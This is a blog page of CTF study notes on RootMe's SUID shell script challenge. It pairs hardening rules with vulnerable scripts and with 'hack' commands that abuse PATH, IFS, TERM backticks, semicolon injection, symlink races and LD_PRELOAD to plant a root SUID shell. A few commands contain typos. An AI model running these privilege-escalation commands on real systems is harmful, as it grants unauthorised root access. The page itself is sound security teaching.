@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>RootMe Challenge: ELF32 System I -- Notebook</title>
+
+    
+
+    
+    <link href="https://mvaude.github.io/notebook/css/bootstrap.min.css" rel="stylesheet">
+
+    
+    <link href="https://mvaude.github.io/notebook/css/clean-blog.min.css" rel="stylesheet">
+
+    
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    
+    
+    
+
+</head>
+
+<body>
+
+    
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://mvaude.github.io/notebook/">Notebook</a>
+            </div>
+
+                       
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    
+                    <li>
+                        <a href="https://mvaude.github.io/notebook/">home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://mvaude.github.io/notebook/post/">Archives</a>
+                    </li>
+                    
+                  </ul>
+            </div>
+           
+
+        </div>
+        
+    </nav>
+
+
+    
+    
+    <header class="intro-header" style="background-image: url('https://mvaude.github.io/notebook//img/about-bg.jpg')">
+      
+      <div class="container">
+        <div class="row">
+           <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+             <div class="post-heading">
+               <h1>RootMe Challenge: ELF32 System I</h1>
+               <h2 class="subheading"></h2>
+               <span class="meta">Posted by <a href="#">Maxime Vaude</a> on Sun, Nov 18, 201135
+                 <br />
+                 In <a href="https://mvaude.github.io/notebook/categories/development" >Development</a>, <a href="https://mvaude.github.io/notebook/categories/programming" >Programming</a>, <a href="https://mvaude.github.io/notebook/categories/hacking" >Hacking</a>, 
+
+                 <br />
+                 Tags <a href="https://mvaude.github.io/notebook/tags/programming" >programming</a> <a href="https://mvaude.github.io/notebook/tags/rootme" >rootme</a> <a href="https://mvaude.github.io/notebook/tags/challenges" >challenges</a> <a href="https://mvaude.github.io/notebook/tags/hack" >hack</a> <a href="https://mvaude.github.io/notebook/tags/crack" >crack</a> 
+
+               </span>
+             </div>
+           </div>
+        </div>
+      </div>
+    </header>
+
+    
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                  
+
+<h1 id="elf32-system-1-suid-scripts-vulnerabilities:5b4b6ad1a22024f58da79e5ddd85c41e">ELF32 - System 1 - SUID scripts vulnerabilities</h1>
+
+<h1 id="resources:5b4b6ad1a22024f58da79e5ddd85c41e">Resources</h1>
+
+<h2 id="danger-of-suid-shell-scripts-http-repository-root-me-org-administration-unix-en-20-20dangers-20of-20suid-20shell-20scripts-pdf:5b4b6ad1a22024f58da79e5ddd85c41e"><a href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">Danger of SUID Shell Scripts</a></h2>
+
+<h2 id="1-never-use-c-shell-for-suid-scipts:5b4b6ad1a22024f58da79e5ddd85c41e">1. Never use C-shell for SUID scipts</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ ls change-pass
+-rwsr-x---  1 root helpdesk 37 Feb 26 16:35 change-pass
+
+$ cat change-pass
+#!/bin/csh -b
+set user = $1
+passwd $user
+</code></pre>
+
+<ul>
+<li>Hack:</li>
+</ul>
+
+<pre><code>$ env TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass
+</code></pre>
+
+<h2 id="2-always-manually-set-the-path-and-use-absolute-path-names:5b4b6ad1a22024f58da79e5ddd85c41e">2. Always manually set the PATH and use absolute path names.</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+#!/bin/ksh
+user=$1
+passwd $user
+</code></pre>
+
+<ul>
+<li>Hack:</li>
+</ul>
+
+<pre><code>$ export PATH='/tmp'
+$ echo &quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot; &gt; /tmp/passwd
+$ ./change-pass
+</code></pre>
+
+<h2 id="3-understand-how-the-programs-in-your-script-work-escpecially-how-they-handle-arguments:5b4b6ad1a22024f58da79e5ddd85c41e">3. Understand how the programs in your script work, escpecially how they handle arguments</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+#!/bin/ksh
+PATH='/bin:/usr/bin'
+user=$1
+rm /tmp/.user
+echo &quot;$user&quot; &gt; /tmp/.user
+isroot='/usr/bin/grep -c root /tmp/.user'
+[ &quot;$isroot&quot; -gt 0 ] &amp;&amp; echo &quot;You Can't change root's password!&quot; &amp;&amp; exit
+/usr/bin/passwd $user
+</code></pre>
+
+<ul>
+<li>Hack:</li>
+</ul>
+
+<p>If the user runs the program and doesn&rsquo;t specify an argument, the program will run the passwd command without any arguments. It default so to the current user, the problem is that in a root-owned SUID script, the current user is always root.</p>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+$!/bin/ksh
+PATH='/bin:/usr/bin'
+user=$1
+[ -z $user ] &amp;&amp; echo &quot;Usage: change-pass username&quot; &amp;&amp; exit
+rm /tmp/.user
+echo &quot;$user&quot; &gt; /tmp/.user
+isroot='/usr/bin/grep -c root /tmp/.user'
+[ &quot;$isroot&quot; -gt 0] &amp;&amp; echo &quot;You Can't change root's password!&quot; &amp;&amp; exit
+/usr/bin/passwd $user
+</code></pre>
+
+<ul>
+<li>Hack:</li>
+</ul>
+
+<p>A hacker could write a program that will automatically watch for activity and replace the /tmp/.user file between the <code>rm</code> and <code>echo</code> by an empty one. It could not be overwritten and so run as root.</p>
+
+<h2 id="4-don-t-use-temporary-files-don-t-put-them-in-a-publicity-writable-area:5b4b6ad1a22024f58da79e5ddd85c41e">4. Don&rsquo;t use temporary files, don&rsquo;t put them in a publicity writable area</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+#!/bin/ksh
+PATH='/bin:/usr/bin'
+user=$1
+[ -z $user ] &amp;&amp; echo &quot;Usage: change-pass username&quot; &amp;&amp; exit
+[ &quot;$user&quot; = root ] &amp;&amp; echo &quot;You can't change root's password!&quot; &amp;&amp; exit
+/usr/bin/passwd $user
+</code></pre>
+
+<ul>
+<li>Hack (semi-colon trick):</li>
+</ul>
+
+<pre><code>$ change-pass &quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;
+</code></pre>
+
+<h2 id="5-distrust-and-check-all-user-input-and-strip-out-any-meta-characters:5b4b6ad1a22024f58da79e5ddd85c41e">5. Distrust and check all user input, and strip out any meta-characters</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+#!/bin/ksh
+PATH='/bin:/usr/bin'
+user=${1##*[ \\$/;()|\&gt;\&lt;&amp;    ]}
+[ -z $user ] &amp;&amp; echo &quot;Usage: change-pass username&quot; &amp;&amp; exit
+[ &quot;$user&quot; = root ] &amp;&amp; &quot;You can't change root's password!&quot; &amp;&amp; exit
+/usr/bin/passwd $user
+</code></pre>
+
+<ul>
+<li>Hack (Internal Filed Separator (IFS) vulnerability):</li>
+</ul>
+
+<pre><code>$ export IFS='/'
+</code></pre>
+
+<h2 id="6-always-manually-set-ifs:5b4b6ad1a22024f58da79e5ddd85c41e">6. Always manually set IFS</h2>
+
+<ul>
+<li>Script:</li>
+</ul>
+
+<pre><code>$ cat change-pass
+#!/bin/ksh
+PATH='/bin:/usr/bin'
+IFS=' '
+user=${1##*[ \\$/;()|\&gt;\&lt;&amp;    ]}
+[ -z $user ] &amp;&amp; echo &quot;Usage: change-pass username&quot; &amp;&amp; exit
+[ &quot;$user&quot; = root ] &amp;&amp; &quot;You can't change root's password!&quot; &amp;&amp; exit
+/usr/bin/passwd $user
+</code></pre>
+
+<ul>
+<li>Hack:</li>
+</ul>
+
+<pre><code>// Create a link to the SUID script:
+$ cd /tmp
+ln -s change-pass rootme
+
+// Running the link, quickly replace it with another file:
+$ ./rootmer &amp;
+&amp; rm rootme &amp;&amp; \
+  echo &quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot; \
+    &gt;&gt; rootme
+</code></pre>
+
+<h2 id="7-don-t-use-suid-shell-scripts:5b4b6ad1a22024f58da79e5ddd85c41e">7. Don&rsquo;t use SUID shell scripts</h2>
+
+<p>There are the more secure options (even more):
+  - a wrapper program written in C
+  - a Perl script
+  - a program like sudo</p>
+
+<h2 id="suid-privileged-programs-http-repository-root-me-org-administration-unix-en-20-20suid-20privileged-20programs-pdf:5b4b6ad1a22024f58da79e5ddd85c41e"><a href="http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf">SUID Privileged Programs</a></h2>
+
+<h2 id="1-how-set-uid-mechanism-works:5b4b6ad1a22024f58da79e5ddd85c41e">1. How Set-UID Mechanism Works</h2>
+
+<h3 id="motivations:5b4b6ad1a22024f58da79e5ddd85c41e">Motivations</h3>
+
+<p>– You want other people to be able to search some words in your file, but you don’t want them to be able to read the file. How do you achieve this?
+– Users’ passwords are stored in/etc/shadow, which is neither readable nor writable to normal users.  However, the passwd program allows users to change their passwords.  Namely, when users run <code>passwd</code>, they can suddenly modify <code>/etc/shadow</code>. Moreover users can only modify one entry in <code>/etc/shadow</code>, but not the other people’s entries. How is this achieved?</p>
+
+<h3 id="set-uid-programs:5b4b6ad1a22024f58da79e5ddd85c41e">Set-UID programs</h3>
+
+<p>– The concept of effective uid and real uid.
+– For non Set-UID programs, the effective uid and the real uid are the same.
+– For Set-UID programs, the effective uid is the owner of the program, while the real uid is the user of the program.</p>
+
+<h3 id="effective-user-uid-and-real-user-uid:5b4b6ad1a22024f58da79e5ddd85c41e">Effective User UID and Real User UID</h3>
+
+<p>– At login time, the real user ID, effective user ID, and saved user ID of the login process are set to the login ID of the user responsible for the creation of the process.  The same is true for the real, effective, and saved group IDs; they are set to the group ID of the user responsible for the creation of the process.
+– When a process calls one of the <code>exec</code> family of functions to execute a file (program), the user
+and/or group identifiers associated with the process can change. If the file executed is a set-user-ID file, the effective and saved user IDs of the process are set to the owner of the file executed.
+If the file executed is a set-group-ID file, the effective and saved group IDs of the process are set to the group of the file executed. If the file executed is not a set-user-ID or set-group-ID file, the effective user ID, saved user ID, effective group ID, and saved group ID are not changed.
+– Access control is based on effective user IDs and group ID</p>
+
+<h3 id="how-to-turn-on-the-set-uid-bit:5b4b6ad1a22024f58da79e5ddd85c41e">How to turn on the Set-UID bit ?</h3>
+
+<pre><code>$ 4755 file ---&gt; -rwsr-xr-x
+</code></pre>
+
+<h2 id="2-vulnerabilites-of-set-uid-programs:5b4b6ad1a22024f58da79e5ddd85c41e">2. Vulnerabilites of Set-UID Programs</h2>
+
+<h3 id="hidden-inputs-environment-variables:5b4b6ad1a22024f58da79e5ddd85c41e">Hidden Inputs: Environment Variables</h3>
+
+<ul>
+<li><code>PATH</code> Envronment Variable</li>
+</ul>
+
+<pre><code>system(&quot;mail&quot;);
+
+$ PATH=&quot;.:PATH&quot;; export PATH
+</code></pre>
+
+<ul>
+<li><code>IFS</code> Environment Variable</li>
+</ul>
+
+<pre><code>$ IFS=&quot;/ \t\n&quot;; export IFS
+
+system(&quot;/bin/mail root&quot;); ---&gt; system(&quot; bin mail root&quot;);
+</code></pre>
+
+<ul>
+<li><code>LD_LIBRARY_PATH</code> Environment Variable</li>
+</ul>
+
+<pre><code>$ ldd /bin/ls
+$ setenv LD_LIBRARY_PATH .:$LD_LIBRARY_PATH
+</code></pre>
+
+<ul>
+<li><code>LD_PRELOAD</code> Environment Variable</li>
+</ul>
+
+<pre><code>$ export LD_PRELOAD=./libmylib.so.1.0.1
+
+// a.c
+#include &lt;stdio.h&gt;
+void sleep (int s) {
+    printf(&quot;I am not sleeping!\n&quot;);
+}
+
+$ gcc -fPIC -g -c a.c
+$ gcc -shared -o libmylib.so.1.0.1 a.o -lc
+
+// target.c
+int main() {
+    sleep(1);
+    return(0);
+}
+</code></pre>
+
+<h3 id="other-well-known-vulnerability-patterns:5b4b6ad1a22024f58da79e5ddd85c41e">Other Well-Known Vulnerability Patterns</h3>
+
+<ul>
+<li>Bufferflow Vulnerability</li>
+<li>Race Condition Vulnerability</li>
+<li>Format-String Vulnerability</li>
+</ul>
+
+<h3 id="miscelaneous-vulnerabilities:5b4b6ad1a22024f58da79e5ddd85c41e">Miscelaneous Vulnerabilities</h3>
+
+<ul>
+<li><code>lpr</code> vulnerability</li>
+<li><code>chsh</code> vulnerability</li>
+<li><code>sendmail</code> vulnerability</li>
+</ul>
+
+<h2 id="3-improving-the-security-of-set-uid-programs:5b4b6ad1a22024f58da79e5ddd85c41e">3. Improving the Security of <code>Set-UID</code> Programs</h2>
+
+<ul>
+<li>The <code>exec</code> functions</li>
+<li>Improve the security of system()</li>
+</ul>
+
+<h2 id="4-principle-of-least-privilege:5b4b6ad1a22024f58da79e5ddd85c41e">4. Principle of Least Privilege</h2>
+
+<blockquote>
+<p>Every program and every user of the system should operate using the least set of privileges necessary to complete the job.</p>
+</blockquote>
+
+<p>The most important reason for limiting the security privileges your code requires to run is to reduce
+the damage that can occur should your code be exploited by a malicious user.  If your code only
+runs with basic privileges, its difficult for malicious users to do much damage with it. If you require
+users to run your code using administrator privileges, then any security weakness in your code could
+potentially cause greater damage by the malicious code that exploits that weakness.</p>
+
+<h3 id="questions-to-ask-when-writing-a-privilege-program:5b4b6ad1a22024f58da79e5ddd85c41e">Questions to ask when writing a privilege program</h3>
+
+<ul>
+<li>Does the program need all the privileges ?</li>
+<li>Does the program need all the privileges ?</li>
+<li>Does the program need the privileges now ?</li>
+<li>Does the program need the privileges in the future ?</li>
+</ul>
+
+<h3 id="what-mechanisms-does-unic-provide-for-us-to-achieve-the-least-privilege-principle:5b4b6ad1a22024f58da79e5ddd85c41e">What mechanisms does Unic provide for us to achieve the least-privilege principle ?</h3>
+
+<p>Usefule system calls:
+  - <code>setuid()</code>
+  - <code>seteuid()</code>
+  - <code>setgid()</code>
+  - <code>setegid()</code></p>
+
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <hr>
+    
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                  <ul class="list-inline text-center">
+                    <li>
+                      <a href="mailto:maxime.vaude@gmail.com">
+                        <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope-o fa-stack-1x fa-inverse"></i>
+                        </span>
+                      </a>
+                    </li>
+                    
+                    <li>
+                      <a href="https://twitter.com/wefirm">
+                        <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                        </span>
+                      </a>
+                    </li>
+                    
+                    <li>
+                      <a href="https://github.com/mvaude">
+                        <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                        </span>
+                      </a>
+                    </li>
+                    
+                    <li>
+                      <a href="https://www.facebook.com/FACEBOOKHANDLE">
+                        <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                        </span>
+                      </a>
+                    </li>
+                    
+                  </ul>
+                  <p class="copyright text-muted">Code released WTFPL license.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    
+    <script src="https://mvaude.github.io/notebook/js/jquery.min.js"></script>
+
+    
+    <script src="https://mvaude.github.io/notebook/js/bootstrap.min.js"></script>
+
+    
+    <script src="https://mvaude.github.io/notebook/js/clean-blog.js"></script>
+
+    
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'XX-00000000-0', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+</body>
+
+</html>
+
